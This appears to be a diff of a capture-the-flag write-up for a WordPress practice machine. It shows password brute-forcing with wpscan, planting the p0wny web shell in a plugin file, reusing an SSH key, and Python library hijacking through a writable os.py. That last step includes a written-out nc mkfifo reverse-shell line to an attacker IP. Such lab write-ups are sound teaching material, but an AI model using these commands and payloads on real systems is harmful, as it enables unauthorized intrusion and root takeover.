@@ -22,9 +22,9 @@ This one was hard. Several new things learned. And I unashamedly used both the t
 
 3. `wpscan --url jack.thm -U wendy,danny -P /usr/share/wordlists/fasttrack.txt` quickly picked up a password for wendy: `changelater`
 
-4. Once into the site, I used the vulnerability with the user role editor to grant wendy admin rights. 
+4. Once into the site, I used the vulnerability with the user role editor to grant wendy admin rights (used burp to intercept the 'Update Profile' POST, added the extra body param, and forwarded the request on).
 
-5. I replaced the content of the akismet plugin's index.php with p0wny shell (probably overkill - could have added a new file or uploaded something), then browsed to `http://jack.thm/wp-content/plugins/akismet/index.php` to get a web shell.
+5. I replaced the content of the akismet plugin's `index.php` with [p0wny shell](https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php) (probably overkill - could have added a new file or uploaded something), then browsed to `http://jack.thm/wp-content/plugins/akismet/index.php` to get a web shell.
 
 6. In the user directory were two text files: `user.txt` and `reminder.txt`. The first contained the user flag: `0052f7829e48752f2e7bf50f1231548a`
 
@@ -32,13 +32,18 @@ This one was hard. Several new things learned. And I unashamedly used both the t
 
 8. I copied this to my attacker machine, changed its permissions with `chmod 600 id_rsa`, then used `ssh -i id_rsa jack@jack.thm` to log on as jack.
 
-9. The final escalation hint was "Python". From the room description I knew this was a python module escalation, which I hadn't heard before.
+9. The final escalation hint was "Python". From the room description I knew this was a 'python module escalation', which I hadn't heard of before.
 
     > I did a google and found this article: https://rastating.github.io/privilege-escalation-via-python-library-hijacking/, The whole thing is worth a read, and from it I solved this final challenge.
     >
-    > Basically, if a python script is being run by root, and it imports something, and you have the ability to alter either: any of the search directories python uses for import sources; or any of the imported files themselves, then you can get code execution by reference.
+    > Basically, if a python script you can't edit directly is being run by root, but it imports something that you have the ability to alter either by: 
+    >
+    > - putting a same named file in any of the search directories python uses for import sources; 
+    > - or by editing the module file directly, 
+    > 
+    > Then you can get code execution by reference.
 
-10. I ran a search (`find / -name "*.py" -user root 2>/dev/null`) to find suspicious files: on the giant list, the very first file was very suspicious: `/opt/statuscheck/checker.py`. Next to it was an output.log containing header information for the wordpress site, updated every two minutes. The checker.py file contained:
+10. I ran a search (`find / -name "*.py" -user root 2>/dev/null`) to find suspicious files. On the giant results list, the very first file was  suspicious: `/opt/statuscheck/checker.py`. Next to it was an `output.log` containing header information for the wordpress site, updated every two minutes. The `checker.py` file contained:
 
     ```python
     import os
@@ -50,7 +55,7 @@ This one was hard. Several new things learned. And I unashamedly used both the t
 
 11. I couldn't modify the file. Nor could I modify any of the source directories python looked into (I checked this with a little bash scripting: `for path in $(python -c 'import sys; print "\n".join(sys.path)'); do namei -l $path ; done`. note the use of `namei -l` to get a full list of file/folder permissions for each entry). However I did discover that `os.py` under `/usr/lib/python2.7` *WAS* writable (checked via `for path in $(locate os.py); do namei -l $path; done`).
 
-12. Adding a python shell to this proved problematic. Python shells use functionality from os.py, after all. Ultimately, the solution was to open os.py, go to the bottom, and add a new line: `system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.203.251 4444 >/tmp/f')`. The nice nc reverse shell for when all you have is nc.openbsd (as was the case on this machine). I tested this (getting an unpriviliged shell) via `python -c "import os"`
+12. Adding a python shell to this proved problematic - python shells typically use functionality *from* `os.py`, after all. Ultimately, the solution was to open `os.py`, go to the bottom, and add a new line: `system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.203.251 4444 >/tmp/f')`. The nice nc reverse shell for when all you have is `nc.openbsd` (as was the case on this machine). I tested this (getting an unpriviliged shell) via `python -c "import os"`
 
 13. Went back to my attacker machine, opened a reverse listener, and within a minute I had a root shell! The final flag at `/root/root.txt` was `b8b63a861cc09e853f29d8055d64bffb`.
 
